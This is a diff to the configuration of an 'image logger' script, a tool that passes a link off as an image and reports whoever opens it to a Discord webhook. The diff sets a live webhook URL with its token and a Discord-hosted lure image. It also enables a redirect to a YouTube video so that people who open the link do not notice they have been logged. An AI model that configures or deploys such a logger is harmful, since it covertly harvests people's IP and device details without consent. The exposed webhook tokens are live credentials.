@@ -12,8 +12,8 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
-    "image": "c:\Users\Dawggydawg\Pictures\70ce41310f8a9c2a84e97b57198015d9.gif", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1369282563784441856/h3tUAuOYn4x-WES3kCas5x5I8nw2KNhUsERenma0W22zckPVbsqbtu6Ozjy49J24ZUQz",
+    "image": "https://media.discordapp.net/attachments/1369281337386733599/1369281371553398804/CQ21Exo8g423wwZaH1tqHMJaHhBGBwbjfJwfqmKwZD1z44Nf8gfwSZGV823Nx1BSl2A.png?ex=681b4a26&is=6819f8a6&hm=083f0db02194f2414db2e16efd7aa2733435e95b12f940d188819a6b6f56d827&=&format=webp&quality=lossless&width=410&height=410", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.youtube.com/watch?v=J5_HmfZyhKo&t=43s" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
